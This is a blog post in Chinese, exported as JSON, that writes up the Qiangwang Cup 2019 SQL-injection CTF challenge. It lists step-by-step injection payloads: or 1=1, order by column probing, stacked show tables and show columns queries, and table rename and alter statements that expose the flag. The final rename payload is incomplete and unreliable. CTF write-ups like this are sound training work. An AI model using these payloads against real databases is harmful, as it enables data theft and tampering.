{"title":"强网杯 2019-随便注1","uid":"d2622bc92b9e5688d6557c15077022e8","slug":"强网杯-2019-随便注1","date":"2023-02-11T11:38:55.000Z","updated":"2023-02-13T12:16:39.281Z","comments":true,"path":"api/articles/强网杯-2019-随便注1.json","keywords":null,"cover":[],"content":"<p>进入题目发现输入框中默认有一个数字1，点击提交查询有内容回显</p>\n<p><img src=\"/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81/1.png\"></p>\n<p>输入1’</p>\n<p><img src=\"/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81/2.png\"></p>\n<p>判断闭合符号为单引号’</p>\n<p>输入1‘ or 1&#x3D;1 – +</p>\n<p><img src=\"/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81/3.png\"></p>\n<p>查询出了当前表中的所有数据</p>\n<p>用order by查看显示列数</p>\n<p>1’ order by 3; – +</p>\n<p><img src=\"/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81/4.png\"></p>\n<p>1’ order by 2; – +</p>\n<p><img src=\"/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81/5.png\"></p>\n<p>列数为2</p>\n<p>尝试利用union联合查询获取库名</p>\n<p>1’ union select 1,databases(); – +</p>\n<p><img src=\"/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81/6.png\"></p>\n<p>select被过滤，无法使用联合查询</p>\n<p>尝试堆叠注入</p>\n<p>堆叠注入原理：在sql中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，继续加一个分号和一条语句，这样就可以在一次数据库的调用中执行多个语句。</p>\n<p>1’; show tables; – +</p>\n<p>得到所有表名</p>\n<p><img src=\"/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81/7.png\"></p>\n<p>1’;show columns from `words`; – +</p>\n<p><img src=\"/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81/8.png\"></p>\n<p>1’;show columns from `1919810931114514`; – +</p>\n<p><img src=\"/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81/9.png\"></p>\n<p>注意：在windows系统下，反单引号（&#96;）是数据库、表、索引、列和别名用的引用符</p>\n<p>发现要获取的flag在1919810931114514表中</p>\n<p>words表的表结构中有id和data两列</p>\n<p>猜测提交查询的窗口默认是在words表中查询数据的</p>\n<p>那么查询语句很有可能是select id,data from words where id &#x3D; </p>\n<p>可以利用堆叠查询，将1919810931114514表更名为words，words更名为其他来获取flag</p>\n<p>1’;rename table words to words1;rename table  `1919810931114514` ;alter table words change flag id varchar(100)</p>\n<p><img src=\"/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81/10.png\"></p>\n<p>再通过1‘ or 1&#x3D;1 – +查看得到flag</p>\n<p><img src=\"/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81/11.png\"></p>\n","text":"进入题目发现输入框中默认有一个数字1，点击提交查询有内容回显 输入1’ 判断闭合符号为单引号’ 输入1‘ or 1&#x3D;1 – + 查询出了当前表中的所有数据 用order by查看显示列数 1’ order by 3; – + 1’ order by 2; – + 列数为...","link":"","photos":[],"count_time":{"symbolsCount":800,"symbolsTime":"1 mins."},"categories":[],"tags":[],"toc":"","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"SUCTF 2019-EasySQL1","uid":"9c12cc8931e1d45af488da74ebbb23fe","slug":"SUCTF-2019-EasySQL1","date":"2023-02-14T08:25:57.000Z","updated":"2023-02-14T08:47:37.769Z","comments":true,"path":"api/articles/SUCTF-2019-EasySQL1.json","keywords":null,"cover":[],"text":"进入题目 输入数字1，有回显内容 输入其他数字效果相同 输入字母没有回显内容 输入or and union等等字段回显Nonono 判断这些关键字都被过滤掉了，无法进行联合查询 尝试堆叠查询 输入1;show tables; 输入1;show columns from Flag;...","link":"","photos":[],"count_time":{"symbolsCount":627,"symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"sQL注入","slug":"sQL注入","count":1,"path":"api/tags/sQL注入.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"ACTF2020新生赛-Exec 1","uid":"8ee11d581b86b5771cc67e49ad808b9c","slug":"ACTF2020新生赛-Exec-1","date":"2023-02-09T11:27:22.000Z","updated":"2023-02-09T11:36:28.355Z","comments":true,"path":"api/articles/ACTF2020新生赛-Exec-1.json","keywords":null,"cover":[],"text":"观察题目是一个执行ping命令的页面 PHP可以模拟DOS命令中的ping命令，采用的是php的内置函数exec来调用系统的ping命令的。于是采用exec内置函数来执行 对于exec函数： ;前面和后面命令都要执行，无论前面真假 |直接执行后面的语句 ||如果前面命令是错的那么...","link":"","photos":[],"count_time":{"symbolsCount":332,"symbolsTime":"1 mins."},"categories":[],"tags":[],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}